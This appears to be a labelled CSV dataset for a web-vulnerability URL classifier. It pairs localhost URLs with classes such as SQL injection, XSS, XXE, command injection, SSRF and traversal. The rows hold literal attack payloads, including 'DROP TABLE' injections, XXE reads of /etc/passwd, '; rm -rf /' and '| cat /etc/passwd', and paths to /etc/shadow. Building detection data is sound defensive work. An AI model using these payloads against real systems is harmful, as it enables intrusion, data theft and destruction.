URL,Vulnerability Type
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/user?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/search?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/search?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/profile?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/search?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/invoice?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/upload?command=| netstat -an,Command Injection
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/download?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/search?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/messages?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/dashboard?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/download?load=config.php,File Inclusion
http://127.0.0.1:5000/file?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/search?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/profile?command=| netstat -an,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/search?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/order?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/review?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/profile?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/user?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/messages?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/report?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/search?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/download?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/order?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/invoice?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/profile?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/search?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/order?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/report?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/report?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/comments?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/download?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/upload?load=config.php,File Inclusion
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/search?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/upload?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/search?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/order?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/report?load=config.php,File Inclusion
http://127.0.0.1:5000/admin?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/comments?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/settings?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/admin?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/upload?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/download?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/profile?doc=http://example.com/malicious.txt,File Inclusion
"http://127.0.0.1:5000/checkout?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/review?command=| netstat -an,Command Injection
http://127.0.0.1:5000/admin?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/user?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/order?path=/var/www/html/index.php,File Inclusion
"http://127.0.0.1:5000/settings?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/profile?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/product?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/review?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/order?command=| netstat -an,Command Injection
http://127.0.0.1:5000/profile?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/posts?command=| netstat -an,Command Injection
http://127.0.0.1:5000/upload?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/posts?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/upload?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/product?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/user?user=admin'--,SQL Injection
http://127.0.0.1:5000/report?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/settings?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/review?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/product?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/settings?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/comments?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/profile?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/download?command=| netstat -an,Command Injection
http://127.0.0.1:5000/download?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/settings?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/cart?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?load=config.php,File Inclusion
http://127.0.0.1:5000/user?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/user?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/review?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/checkout?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/dashboard?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/order?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/download?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/settings?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/profile?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/posts?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/report?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/review?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/upload?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/order?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/search?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/posts?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/download?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/checkout?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/upload?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/user?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/order?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/file?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/user?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/file?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/admin?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/upload?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/messages?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/admin?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/login?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/profile?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/search?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/file?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/profile?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/order?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/user?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/review?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/checkout?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/dashboard?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/posts?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/comments?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/download?run=`whoami`,Command Injection
http://127.0.0.1:5000/settings?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/search?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/admin?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/order?command=| netstat -an,Command Injection
http://127.0.0.1:5000/cart?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/admin?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/download?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/report?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/download?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/file?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/download?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/upload?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/product?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/file?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/download?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/checkout?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/order?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/settings?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/profile?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/admin?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/profile?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/posts?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/profile?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/admin?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/review?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/file?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/upload?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/file?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/cart?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/download?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/posts?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/product?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/profile?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/file?user=admin'--,SQL Injection
http://127.0.0.1:5000/order?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/checkout?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/comments?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/checkout?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/report?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/file?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/review?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/dashboard?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/user?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/upload?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/messages?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/settings?user=admin'--,SQL Injection
http://127.0.0.1:5000/posts?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/cart?command=| netstat -an,Command Injection
http://127.0.0.1:5000/file?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/settings?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/order?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/profile?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/comments?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/review?command=| netstat -an,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/login?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/checkout?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/messages?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/download?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/user?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/file?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/settings?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/admin?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/upload?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/admin?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/posts?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/product?command=| netstat -an,Command Injection
http://127.0.0.1:5000/upload?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/order?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/download?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/file?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/product?ref=<input onfocus=alert(1)>,XSS
